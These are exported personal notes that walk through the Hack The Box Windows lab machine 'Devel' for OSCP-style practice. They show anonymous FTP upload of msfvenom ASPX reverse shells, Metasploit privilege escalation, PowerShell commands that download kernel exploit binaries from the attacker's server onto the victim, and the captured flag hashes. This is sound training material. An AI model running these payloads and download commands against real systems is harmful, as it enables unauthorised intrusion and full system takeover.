<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="content-type"/>
<title>devel</title>
<meta content="CherryTree" name="generator"/>
<link href="styles.css" rel="stylesheet" type="text/css"/>
</head>
<body><div class="main"><div class="tree">
<p><a href="../HacktheBox--Windows_Boxes.html">Windows Boxes</a></p>
<p><a href="#devel">devel</a></p>
<ol>
<li><a href="#nmap">nmap</a></li>
<li><a href="#http">http</a></li>
<ol>
<li><a href="#gobuster">gobuster</a></li>
</ol>
<li><a href="#ftp anonymous">ftp anonymous</a></li>
<ol>
<li><a href="#welcome.png">welcome.png</a></li>
<li><a href="#ftp upload">ftp upload</a></li>
</ol>
<li><a href="#root through metasploit">root through metasploit</a></li>
<ol>
<li><a href="#msfvenom aspx reverse shell">msfvenom aspx reverse shell</a></li>
<li><a href="#suggester">suggester</a></li>
<li><a href="#kitrap0d">kitrap0d</a></li>
</ol>
<li><a href="#w/o metasploit">w/o metasploit</a></li>
<ol>
<li><a href="#initial foothold">initial foothold</a></li>
<li><a href="#windows exploit suggester">windows exploit suggester</a></li>
<ol>
<li><a href="#sysinfo">sysinfo</a></li>
<li><a href="#report">report</a></li>
</ol>
<li><a href="#MS11-011 (fail)">MS11-011 (fail)</a></li>
<ol>
<li><a href="#readme">readme</a></li>
<li><a href="#download exploit to victim">download exploit to victim</a></li>
</ol>
<li><a href="#MS011-046 (win)">MS011-046 (win)</a></li>
<li><a href="#MS13-005 (win) chimichurri">MS13-005 (win) chimichurri</a></li>
</ol>
<li><a href="#user/root">user/root</a></li>
<li><a href="#lessons learned">lessons learned</a></li>
</ol></div>
<div class="page" id="devel"><h1><b><u>devel</u></b></h1><img alt="images/17-1.png" src="images/17-1.png"/><br/><img alt="images/17-2.png" src="images/17-2.png"/></div>
<div class="page" id="nmap"><h1><b><u>nmap</u></b></h1><span style="color:#ffa500;">nmap -sC -sV -oA nmap/devel 10.10.10.5</span><br/><img alt="images/18-1.png" src="images/18-1.png"/><br/><span style="color:#24ff00;">nmap shows <br/>• ftp is running on port </span><span style="color:#ffa500;">21</span><span style="color:#24ff00;"> with </span><span style="color:#ffa500;">Microsoft ftpd </span><span style="color:#ffff00;">anonymous logins</span><span style="color:#24ff00;"><br/>• http is running on port </span><span style="color:#ffa500;">80</span><span style="color:#24ff00;"> with </span><span style="color:#ffa500;">ISS httpd 7.5</span></div>
<div class="page" id="http"><h1><b><u>http</u></b></h1><img alt="images/495-1.png" src="images/495-1.png"/><br/><img alt="images/495-2.png" src="images/495-2.png"/></div>
<div class="page" id="gobuster"><h1><b><u>gobuster</u></b></h1><span style="color:#ffa500;">gobuster dir -u 10.10.10.5 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br/><img alt="images/498-1.png" src="images/498-1.png"/><br/><span style="color:#24ff00;">unfortunately nothing gets </span><span style="color:#ff0000;">found</span><span style="color:#24ff00;"> with a simple gobuster dirbust</span></div>
<div class="page" id="ftp anonymous"><h1><b><u>ftp anonymous</u></b></h1><span style="color:#24ff00;">our nmap scan shows its </span><span style="color:#ffa500;">FTP</span><span style="color:#24ff00;"> server allows </span><span style="color:#ffff00;">anonymous logins </span><span style="color:#24ff00;">so next logical step is to see what's in the </span><span style="color:#ffa500;">ftp</span><span style="color:#24ff00;"> share</span><br/><img alt="images/307-1.png" src="images/307-1.png"/><br/><br/><span style="color:#ffa500;">ftp 10.10.10.5</span><br/><img alt="images/307-2.png" src="images/307-2.png"/></div>
<div class="page" id="welcome.png"><h1><b><u>welcome.png</u></b></h1><img alt="images/316-1.png" src="images/316-1.png"/></div>
<div class="page" id="ftp upload"><h1><b><u>ftp upload</u></b></h1><span style="color:#24ff00;">lets upload an arbitrary text file to the ftp server</span><br/><img alt="images/317-1.png" src="images/317-1.png"/><br/><br/><span style="color:#ffa500;">put test.txt</span><br/><img alt="images/317-2.png" src="images/317-2.png"/><br/><span style="color:#24ff00;">we see it was </span><span style="color:#ffff00;">uploaded</span><span style="color:#24ff00;">, now lets navigate to is in our web browser<br/><br/></span><img alt="images/317-3.png" src="images/317-3.png"/><br/>perfect, now lets try uploading a script that will call back a shell to us</div>
<div class="page" id="root through metasploit"><h1><b><u>root through metasploit</u></b></h1><span style="color:#24ff00;">first we want to upload our malicious .aspx file into devel's ftp server and run it </span><br/><br/><span style="color:#ffa500;">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f aspx &gt; shell.aspx</span><br/><img alt="images/324-1.png" src="images/324-1.png"/><br/><br/><span style="color:#24ff00;">now connect back to Devel's ftp server and </span><span style="color:#ffa500;">upload</span><span style="color:#24ff00;"> the </span><span style="color:#ffa500;">.aspx </span><span style="color:#24ff00;">reverse shell with </span><br/><span style="color:#ffa500;">put shell.aspx</span><br/><img alt="images/324-2.png" src="images/324-2.png"/></div>
<div class="page" id="msfvenom aspx reverse shell"><h1><b><u>msfvenom aspx reverse shell</u></b></h1><span style="color:#24ff00;">in order to spawn a </span><span style="color:#ffff00;">meterpreter shell</span><span style="color:#24ff00;">, we'll have to set up a </span><span style="color:#ffa500;">multihandler</span><span style="color:#24ff00;"> in </span><span style="color:#ffa500;">metasploit</span><br/><img alt="images/318-1.png" src="images/318-1.png"/><br/><span style="color:#ffa500;">set lhost tun0<br/>run</span><br/><img alt="images/318-2.png" src="images/318-2.png"/><br/><br/><span style="color:#24ff00;">now that our listener is ready, navigate to our </span><span style="color:#ffa500;">.aspx </span><span style="color:#24ff00;">payload by visiting its file directly in the webbrowser</span><br/><img alt="images/318-3.png" src="images/318-3.png"/><br/><br/><img alt="images/318-4.png" src="images/318-4.png"/><br/><br/><br/></div>
<div class="page" id="suggester"><h1><b><u>suggester</u></b></h1><span style="color:#24ff00;">now that we have our foothold, lets background our session and search for metasploit's </span><span style="color:#ffa500;">local_exploit_suggester</span><span style="color:#24ff00;"> module to enumerate all the different vulnerabilities we can use to escalate our privileges to system</span><br/><img alt="images/320-1.png" src="images/320-1.png"/><br/><br/><img alt="images/320-2.png" src="images/320-2.png"/><br/><br/><div class = "codebox"><div style="background-color: #001b33; padding: 10px; border: 1px solid green;">
<span style="color:#ffa500;">[*] 10.10.10.5 - Collecting local exploits for x86/windows...<br/>[*] 10.10.10.5 - 29 exploit checks are being tried...<br/>[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.<br/>[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.<br/>[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.<br/>[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.<br/>[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.<br/>[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.<br/>[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.<br/>[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.<br/>[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.<br/>[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.<br/>[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.<br/>[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.</span><br/></div></div></div>


<div class="page" id="kitrap0d"><h1><b><u>kitrap0d</u></b></h1><span style="color:#24ff00;">although it was not verified to be vulnerable, kitrap0d has a known reputation for being a very powerful privilege escalation tool</span><br/><img alt="images/322-1.png" src="images/322-1.png"/><br/><br/><span style="color:#ffa500;">use windwos/local/ms10_015_kitrap0d</span><br/><span style="color:#24ff00;">to load up the module and </span><br/><span style="color:#ffa500;">show options </span><br/><img alt="images/322-2.png" src="images/322-2.png"/><br/><span style="color:#24ff00;">from here we simply set the session to our backgrounded meterpreter session number </span><span style="color:#ffa500;">1</span><span style="color:#24ff00;"> </span><br/><br/><span style="color:#ffa500;">run</span><br/><img alt="images/322-3.png" src="images/322-3.png"/><br/><span style="color:#24ff00;">and we're </span><span style="color:#ffff00;">system</span><span style="color:#24ff00;">!</span></div>
<div class="page" id="w/o metasploit"><h1><b><u>w/o metasploit</u></b></h1><span style="color:#ffa500;">revisiting this box to crack it without metasploit's crutch<br/><br/>initial foothold will only differ in the payload we use along with msfvenom<br/><br/></span></div>
<div class="page" id="initial foothold"><h1><b><u>initial foothold</u></b></h1><span style="color:#24ff00;">first we want to upload our malicious </span><span style="color:#ffa500;">.aspx</span><span style="color:#24ff00;"> file into devel's ftp server and run it <br/><br/>lets generate our payload with msfvenom</span><br/><span style="color:#ffa500;">msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.62 LPORT=4444 -o reverse_shell.aspx</span><br/><span style="color:#24ff00;">where<br/></span><span style="color:#ffa500;">-p</span><span style="color:#24ff00;"> payload that will connect back to our netcat listener is </span><strong><span style="color:#24ff00;">windows/shell_reverse_tcp</span></strong><br/><span style="color:#ffa500;">-f </span><span style="color:#24ff00;">filetype will be </span><span style="color:#ffa500;">.aspx</span><br/><span style="color:#ffa500;">LHOST</span><span style="color:#24ff00;"> is our attack machine's IP <br/></span><span style="color:#ffa500;">LPORT </span><span style="color:#24ff00;">will be the port we configure our netcat listener on<br/></span><span style="color:#ffa500;">-o</span><span style="color:#24ff00;"> output filename will be </span><strong><span style="color:#ffa500;">reverse_shell.aspx</span></strong><br/><br/><img alt="images/1034-1.png" src="images/1034-1.png"/><br/><br/><span style="color:#24ff00;">next we'll upload our payload onto the </span><span style="color:#ffff00;">devel's</span><span style="color:#24ff00;"> </span><span style="color:#ffa500;">ftp</span><span style="color:#24ff00;"> server<br/></span><img alt="images/1034-2.png" src="images/1034-2.png"/><br/><br/><span style="color:#24ff00;">set our listener on port </span><span style="color:#ffa500;">4444</span><br/><img alt="images/1034-3.png" src="images/1034-3.png"/><br/><br/><span style="color:#24ff00;">and navigate to </span><span style="color:#ffa500;">10.10.10.5/shell.aspx</span><span style="color:#24ff00;"> to run our reverse shell back to us</span><br/><img alt="images/1034-4.png" src="images/1034-4.png"/><br/><br/><img alt="images/1034-5.png" src="images/1034-5.png"/><br/><br/><span style="color:#24ff00;">we're in as</span><span style="color:#ffa500;"> iss apppool </span><br/><img alt="images/1034-6.png" src="images/1034-6.png"/></div>
<div class="page" id="windows exploit suggester"><h1><b><u>windows exploit suggester</u></b></h1><span style="color:#24ff00;">lets use </span><span style="color:#ffa500;">windows_exploit suggester</span><span style="color:#24ff00;">, to find vulnerabilities and privilege escalation routes on this machine, to do that we must<br/>1) update our exploit suggester database<br/>2) save the box's </span><span style="color:#ffa500;">sysinfo</span><span style="color:#24ff00;"> output to a file<br/><br/>first lets update the database<br/></span><span style="color:#ffa500;">python windows-exploit-suggester.py -update</span><br/><img alt="images/1038-1.png" src="images/1038-1.png"/><br/><br/>now lets run the suggester with the command:<br/><span style="color:#ffa500;">python  windows-exploit-suggester.py -i /root/Documents/htb/boxes/devel/withoutMeta/sysinfo -d 2020-06-23-mssb.xls</span><br/><img alt="images/1038-2.png" src="images/1038-2.png"/><br/><br/></div>
<div class="page" id="sysinfo"><h1><b><u>sysinfo</u></b></h1><span style="color:#24ff00;">running systeminfo on in our shell will output everything we need for windows-exploit-suggester</span><br/><img alt="images/1039-1.png" src="images/1039-1.png"/></div>
<div class="page" id="report"><h1><b><u>report</u></b></h1><img alt="images/1040-1.png" src="images/1040-1.png"/><br/><span style="color:#24ff00;">there are a lot of exploits to choose from that can escalate our privileges to root, but for now</span><br/><span style="color:#24ff00;">lets follow rana and use the </span><span style="color:#ffa500;">MS11-011</span> <span style="color:#24ff00;">and see if we have the exploit in our windows_kernel_exploits folder<br/></span><br/></div>
<div class="page" id="MS11-011 (fail)"><h1><b><u>MS11-011 (fail)</u></b></h1><span style="color:#24ff00;">there is a </span><span style="color:#ffa500;">windows-kernel-exploits </span><span style="color:#ffff00;">github repository</span><span style="color:#24ff00;"> filled a variety of different windows exploits</span> <a href="https://github.com/SecWiki/windows-kernel-exploits">here</a><br/><img alt="images/1041-1.png" src="images/1041-1.png"/><br/><span style="color:#24ff00;">checking the windows kernel exploit directory we have </span><span style="color:#ffa500;">ms11-011</span><span style="color:#24ff00;"> installed (although we can find the same exploit with searchsploit as a c program, compile it with </span><span style="color:#ffa500;">mingw-w64 </span><span style="color:#24ff00;">to an exe that way)</span><br/><br/><img alt="images/1041-2.png" src="images/1041-2.png"/><br/><br/><img alt="images/1041-3.png" src="images/1041-3.png"/><br/><br/><span style="color:#24ff00;">lets spin up an http server in this directory and download it to our victim machine</span><br/><img alt="images/1041-4.png" src="images/1041-4.png"/><br/><br/><br/></div>
<div class="page" id="readme"><h1><b><u>readme</u></b></h1><img alt="images/1042-1.png" src="images/1042-1.png"/></div>
<div class="page" id="download exploit to victim"><h1><b><u>download exploit to victim</u></b></h1><span style="color:#24ff00;">for this we'll use the powershell command </span><br/><br/><span style="color:#ffa500;">powershell -c "(new-object system.net.webclient).downloadFile('http://10.10.14.62:5555/MS11-011.exe', 'c:\Users\Public\Downloads\MS10-011.exe')"</span><br/><img alt="images/1044-1.png" src="images/1044-1.png"/><br/><br/><span style="color:#24ff00;">now run it </span><br/><span style="color:#ffa500;">MS11-011.exe</span><br/><img alt="images/1044-2.png" src="images/1044-2.png"/><br/><br/><span style="color:#ff0000;">not quite working so lets try another potential exploit</span></div>
<div class="page" id="MS011-046 (win)"><h1><b><u>MS011-046 (win)</u></b></h1><img alt="images/1045-1.png" src="images/1045-1.png"/><br/><br/><span style="color:#24ff00;">we don't need to compile the source code here because the </span><span style="color:#ffa500;">windows-kernel-exploit r</span><span style="color:#24ff00;">epo has post compiled exploit</span><br/><img alt="images/1045-2.png" src="images/1045-2.png"/><br/><br/><span style="color:#ffa500;">powershell -c "(new-object system.net.webclient).downloadFile('http://10.10.14.62:5555/ms11-046.exe', 'c:\Users\Public\Downloads\ms11-046.exe')"</span><br/><span style="color:#24ff00;"><br/>run it with</span><br/><span style="color:#ffa500;">ms11-046.exe</span><br/><img alt="images/1045-3.png" src="images/1045-3.png"/><br/><span style="color:#24ff00;">and we're </span><span style="color:#ffff00;">system</span><span style="color:#24ff00;">!</span></div>
<div class="page" id="MS13-005 (win) chimichurri"><h1><b><u>MS13-005 (win) chimichurri</u></b></h1><span style="color:#24ff00;">lets try one more exploit from our </span><span style="color:#ffa500;">suggester</span><span style="color:#24ff00;"> for good measure<br/></span><img alt="images/1046-1.png" src="images/1046-1.png"/><br/>also known as the <span style="color:#ffff00;">chimichurri</span><span style="color:#24ff00;"> exploit (no idea why)<br/><br/>we see we already have an executable in our windows-kernel-exploit folder so lets give </span><span style="color:#ffa500;">MS10-059</span> <span style="color:#24ff00;">a shot</span><br/><img alt="images/1046-2.png" src="images/1046-2.png"/><br/><br/><span style="color:#24ff00;">first, set up our http server and download the exploit to</span> <span style="color:#ffff00;">devel</span><span style="color:#24ff00;"> through our foothold shell </span><br/> <br/><span style="color:#ffa500;">powershell -c "(new-object system.net.webclient).downloadFile('http://10.10.14.62:5555/MS10-059.exe', 'c:\Users\Public\Downloads\MS10-059.exe')"</span><br/><img alt="images/1046-3.png" src="images/1046-3.png"/><br/><br/><img alt="images/1046-4.png" src="images/1046-4.png"/><br/><br/><span style="color:#24ff00;">finally, run chimichurri with our attack machine ip and listening port as arguments </span><br/><span style="color:#ffa500;">MS10-059.exe 10.10.14.62 4444</span><br/><img alt="images/1046-5.png" src="images/1046-5.png"/><br/><br/><span style="color:#24ff00;">and we have a system shell!</span><br/><img alt="images/1046-6.png" src="images/1046-6.png"/><br/></div>
<div class="page" id="user/root"><h1><b><u>user/root</u></b></h1><img alt="images/319-1.png" src="images/319-1.png"/><span style="color:#ffff00;"><br/>9ecdd6a3aedf24b41562fea70f4cb3e8<br/></span><img alt="images/319-2.png" src="images/319-2.png"/><br/>e621a0b5041708797c4fc4728bc72b4b</div>
<div class="page" id="lessons learned"><h1><b><u>lessons learned</u></b></h1><span style="color:#24ff00;">Check out Rana Khalil's OSCP writeups and prep at</span> <a href="https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/">https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/</a><br/><img alt="images/1451-1.png" src="images/1451-1.png"/></div>
</div></body></html>